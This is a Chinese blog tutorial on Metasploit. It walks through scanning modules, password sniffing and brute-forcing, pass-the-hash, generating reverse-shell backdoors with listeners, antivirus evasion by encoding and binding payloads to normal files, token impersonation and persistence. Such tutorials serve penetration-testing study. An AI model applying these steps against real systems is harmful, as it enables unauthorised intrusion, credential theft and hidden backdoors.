---
title: Metasploit的简单介绍与使用
comments: true
date: 2017-09-30 00:43:53
type:
categories: tool
tags: [TOOL,内网渗透]
---

## 简介

Metasploit不仅仅是一个工具软件，它是为自动化地实施经典的、常规的、复杂新颖的攻击，提供基础设施支持的一个完整框架平台。它可以使使用人员将精力集中在渗透测试过程中那些独特的方面上，以及如何识别信息安全计划的弱点上。Metasploit能够让用户通过选择它的渗透攻击模块、攻击载荷和编码器来轻易实施一次渗透攻击，也可以更进一步编写并执行更为复杂的攻击技术。



<!--more-->

## 使用

#### smb模块

调用`use auxiliary/scanner/smb/smb_version`

![](http://owhak23d7.bkt.clouddn.com/17-9-30/45531921.jpg)

显示设置`show options`

指定端口`set RHOSTS ip段范围`

#### 服务识别

调用ssh部分`use auxiliary/scanner/ssh/ssh_version`

![](http://owhak23d7.bkt.clouddn.com/17-9-30/86509622.jpg)

调用ftp部分`use auxiliary/scanner/ftp/ftp_version`

![](http://owhak23d7.bkt.clouddn.com/17-9-30/28207518.jpg)

...(其他操作与上面类似)

#### 密码嗅探

调用`use auxiliary/sniffer/psnuffle`

![](http://owhak23d7.bkt.clouddn.com/17-9-30/10050902.jpg)

#### snmp扫描

调用`use auxiliary/scanner/snmp/snmp_login`

![](http://owhak23d7.bkt.clouddn.com/17-9-30/15531348.jpg)

调用枚举`use auxiliary/scanner/snmp/snmp_enum`

![](http://owhak23d7.bkt.clouddn.com/17-9-30/64077356.jpg)

#### SMB登录验证

调用`use auxiliary/scanner/smb/smb_login`

![](http://owhak23d7.bkt.clouddn.com/17-9-30/16179419.jpg)

扫描时，**绿色[+]**表示**成功** ，**红色[-]**表示**失败** 

![](http://owhak23d7.bkt.clouddn.com/17-9-30/15957606.jpg)

#### VNC身份识别

调用`use auxiliary/scanner/vnc/vnc_none_auth`

![](http://owhak23d7.bkt.clouddn.com/17-9-30/67828355.jpg)

#### WMAP web扫描

调用`load wmap`![](http://owhak23d7.bkt.clouddn.com/17-9-30/69263243.jpg)

不同部分的帮助信息

`wmap_sites -h`
`wmap_targets -h`
`wmap_run -h`
`wmap_vulns -h`

#### 远程代码执行

1. `search 漏洞名` , 然后`use 相应模块`
2. `show payload` , 然后`set payload xxxx` , `set LHOST`(设置本地IP) , `set target xxxxxx`
3. `exploit`有响应后 , 输入`shell`get shell

- 示例

  ![](http://owhak23d7.bkt.clouddn.com/17-9-30/72592710.jpg)

  ![](http://owhak23d7.bkt.clouddn.com/17-9-30/86964295.jpg)

![](http://owhak23d7.bkt.clouddn.com/17-9-30/27001965.jpg)

#### 口令安全

（以mysql为例）

调用`use auxiliary/scanner/scanner/mysql/mysql_login`

![](http://owhak23d7.bkt.clouddn.com/17-9-30/87670533.jpg)

1. 设置target `set RHOSTS xxxx`
2. 设置用户名 `set USERNAME xxxxx` or `set USER-FILE xxxxxx`
3. 设置密码 `set PASSWORD xxxxxx` or `PASS-FILE xxxx`
4. `exploit`

#### HASH值传递渗透

调用`use exploit/windows/smb/psexec`

![](http://owhak23d7.bkt.clouddn.com/17-9-30/94257763.jpg)

1. `set RHOST xxxxxx` , 然后`set SMBUSER xxxxx`
2. `exploit`
3. `hashdump`
4. `set smbpass xxxxxx`

- 示例

  ![](http://owhak23d7.bkt.clouddn.com/17-9-30/92513595.jpg)

#### 多种后门生成

目前metasploit可以生成的后门有：

- windows后门
- linux后门
- java后门
- php后门
- jsp后门
- asp后门
- aspx后门
- android后门
- ......

生成后门 `msfpayload windows/meterpreter/reverse_tcp LHOST=本地ip LPORT=你想使用的端口 X >路径/名字.exe`

![](http://owhak23d7.bkt.clouddn.com/17-9-30/5044364.jpg)

监听

1. `user exploit/multi/handler`
2. `set payload xxxxxx`, `set LHOST xxxxx`, `set LPORT xxxx`
3. 如果你想加密，还可以用`msfencode -e xxxxxx`  or `-t` or `-o`
4. `exploit`

- 示例

  ![](http://owhak23d7.bkt.clouddn.com/17-9-30/86324209.jpg)

  ![](http://owhak23d7.bkt.clouddn.com/17-9-30/38588764.jpg)

#### 内网渗透

1. 首先获取到目标ip的c段

2. 知道具体某个域后，可以用如下指令进一步了解

   - `use incognito`
   - `list_tokens -u`
   - `impersonate_token xxxxxxx`
   - .....

   ![](http://owhak23d7.bkt.clouddn.com/17-9-30/89394020.jpg)

3. 根据不同需要进行不同的深入操作

#### 病毒免杀

免杀的操作有很多种，可以加壳、改壳、改特殊码等等

这里大概展示一下msfencode的部分操作，建议可以多种+多次的组合来操作

- 示例

  ![](http://owhak23d7.bkt.clouddn.com/17-9-30/34875772.jpg)

  ![](http://owhak23d7.bkt.clouddn.com/17-9-30/14499248.jpg)

  ![](http://owhak23d7.bkt.clouddn.com/17-9-30/34251265.jpg)

  ......

  ​

如果想要绑定正常文件，还可以加入参数`-x`

#### XSS+键盘记录

类似的配合还有很多，提供一个大概思路（如图）

![](http://owhak23d7.bkt.clouddn.com/17-9-30/84616764.jpg)

#### 维持访问

前提是当前有个session存活

通过服务启动`run metsvc -A`

回连时使用`windows/metsvc_bind_tcp`的payload就可以

- 示例

  ![](http://owhak23d7.bkt.clouddn.com/17-9-30/12803034.jpg)

  ![](http://owhak23d7.bkt.clouddn.com/17-9-30/49724016.jpg)





metasploit的功能十分强大，每个模块的具体功能还有很多，具体还是要靠自己去摸索，去尝试，这样在实际操作中才会面对不同的情况都能灵活应对